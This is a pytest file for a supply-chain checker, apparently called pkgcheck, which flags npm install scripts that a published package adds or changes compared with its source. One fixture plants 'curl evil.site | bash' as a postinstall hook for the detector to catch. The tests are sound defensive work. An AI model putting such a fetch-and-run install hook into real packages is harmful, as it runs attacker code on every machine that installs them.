"""Tests for detection rules in rules.py."""

import json
from pathlib import Path

from pkgcheck.compare import match_files
from pkgcheck.models import Finding, Status
from pkgcheck.rules import INSTALL_SCRIPTS, apply_rules, check_install_scripts


def test_no_scripts(tmp_path: Path):
    """Package and source have package.json with no scripts."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(json.dumps({"name": "demo"}))
    (src_dir / "package.json").write_text(json.dumps({"name": "demo"}))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None


def test_identical_scripts(tmp_path: Path):
    """Same install scripts in package and source."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}
    src_data = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"


def test_new_postinstall(tmp_path: Path):
    """Source has no postinstall, package introduces postinstall."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "cool-logger", "scripts": {"postinstall": "curl evil.site | bash"}}
    src_data = {"name": "cool-logger", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"postinstall"' in result[0].snippet
    assert "curl evil.site | bash" in result[0].snippet


def test_new_preinstall(tmp_path: Path):
    """Package introduces preinstall script."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"preinstall": "node pre.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"preinstall"' in result[0].snippet
    assert "node pre.js" in result[0].snippet


def test_new_install(tmp_path: Path):
    """Package introduces install script."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"install": "node install.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"install"' in result[0].snippet
    assert "node install.js" in result[0].snippet


def test_modified_existing_install_script(tmp_path: Path):
    """Source and package both have postinstall, but commands differ."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node modified.js"}}
    src_data = {"name": "demo", "scripts": {"postinstall": "node original.js"}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"postinstall"' in result[0].snippet
    assert "node modified.js" in result[0].snippet


def test_non_install_script(tmp_path: Path):
    """Package adds test or lint scripts; must remain EXPECTED."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"test": "pytest", "lint": "eslint .", "build": "tsc"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None


def test_malformed_package_json(tmp_path: Path):
    """Invalid JSON must not raise an exception."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text("{ broken json: ")
    (src_dir / "package.json").write_text("{ also broken: ")

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "package.json"


def test_missing_package_json(tmp_path: Path):
    """Missing package.json must not raise an exception."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "package.json"


def test_preserve_unrelated_findings(tmp_path: Path):
    """Unrelated findings must not be modified."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node evil.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    other_finding = Finding(
        file="src/index.js",
        status=Status.EXPECTED,
        reason="matched",
        snippet="console.log('hi')",
        line=10,
    )
    pkg_finding = Finding(file="package.json", status=Status.EXPECTED, reason="matched")

    findings = [other_finding, pkg_finding]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].file == "src/index.js"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet == "console.log('hi')"
    assert result[0].line == 10

    assert result[1].file == "package.json"
    assert result[1].status == Status.SUSPICIOUS
    assert result[1].reason == "install-script"


def test_apply_rules_entry_point(tmp_path: Path):
    """apply_rules forwards to check_install_scripts and integrates with match_files."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"prepare": "node prep.js"}})
    )
    (src_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {}})
    )

    findings = match_files(["package.json"], ["package.json"])
    enriched = apply_rules(pkg_dir, src_dir, findings)

    assert len(enriched) == 1
    assert enriched[0].file == "package.json"
    assert enriched[0].status == Status.SUSPICIOUS
    assert enriched[0].reason == "install-script"
    assert '"prepare"' in enriched[0].snippet
